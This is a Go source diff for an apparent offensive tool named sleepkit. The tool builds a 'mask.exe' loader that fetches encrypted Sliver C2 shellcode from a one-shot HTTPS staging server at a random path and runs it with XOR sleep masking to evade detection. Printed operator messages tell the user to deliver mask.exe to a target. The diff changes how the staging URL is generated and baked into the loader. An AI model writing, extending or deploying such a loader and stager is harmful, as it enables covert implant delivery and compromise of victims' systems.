@@ -7,6 +7,7 @@ package main
 
 import (
 	"fmt"
+	"net/url"
 	"os"
 	"time"
 
@@ -105,23 +106,40 @@ func runBuild(_ *cobra.Command, _ []string) error {
 		return fmt.Errorf("writing payload: %w", err)
 	}
 
-	maskPath, err := stage.BuildMask(bundle, buildURL, buildOutput, sleepMS, buildGarble)
+	// When --serve: generate server early so the random path is known before
+	// compiling mask.exe. The URL baked into mask.exe must match the server path.
+	effectiveURL := buildURL
+	var srv *stage.Server
+	if buildServe {
+		srv = stage.NewServer(bundle.Ciphertext, buildPort)
+		base, err := url.Parse(buildURL)
+		if err != nil {
+			return fmt.Errorf("invalid --url: %w", err)
+		}
+		effectiveURL = fmt.Sprintf("%s://%s%s", base.Scheme, base.Host, srv.Path())
+	}
+
+	maskPath, err := stage.BuildMask(bundle, effectiveURL, buildOutput, sleepMS, buildGarble)
 	if err != nil {
 		return fmt.Errorf("building mask.exe: %w", err)
 	}
 
 	fmt.Printf("[+] payload  → %s\n", payloadPath)
 	fmt.Printf("[+] mask.exe → %s\n", maskPath)
-	fmt.Printf("[+] url      → %s\n", buildURL)
 	fmt.Printf("[+] sleep    → %s (%d ms)\n", buildSleep, sleepMS)
-	fmt.Printf("[i] Deliver mask.exe to target. Start serve before executing.\n")
-	fmt.Printf("[i] mask.exe self-hosts Sliver shellcode with XOR sleep masking.\n")
 
 	if buildServe {
-		fmt.Printf("[*] Starting one-time HTTPS server on :%d …\n", buildPort)
-		srv := stage.NewServer(bundle.Ciphertext, buildPort)
+		fmt.Printf("[*] One-shot HTTPS server on :%d — shuts down after one download\n", buildPort)
+		fmt.Printf("[+] Staging URL: %s\n", effectiveURL)
+		fmt.Printf("    (random path — baked into mask.exe, only this URL works)\n")
+		fmt.Printf("[i] Deliver mask.exe to target. It fetches shellcode and runs with sleep masking.\n")
 		return srv.ListenAndServe()
 	}
+
+	fmt.Printf("[+] url      → %s\n", effectiveURL)
+	fmt.Printf("[i] Deliver mask.exe to target. Start the staging server first:\n")
+	fmt.Printf("[i]   sleepkit serve --payload %s --port %d\n", payloadPath, buildPort)
+	fmt.Printf("[i] The URL printed by serve must match the --url you used here.\n")
 	return nil
 }
 
@@ -150,8 +168,10 @@ func runServe(_ *cobra.Command, _ []string) error {
 	if err != nil {
 		return fmt.Errorf("reading payload: %w", err)
 	}
-	fmt.Printf("[*] Serving %s on :%d (one download, then shutdown)\n", servePayload, servePort)
 	srv := stage.NewServer(data, servePort)
+	fmt.Printf("[*] One-shot HTTPS server on :%d — shuts down after one download\n", servePort)
+	fmt.Printf("[+] Staging URL: https://<your-ip>:%d%s\n", servePort, srv.Path())
+	fmt.Printf("    Build mask.exe with: sleepkit build --url https://<your-ip>:%d%s ...\n\n", servePort, srv.Path())
 	return srv.ListenAndServe()
 }
 
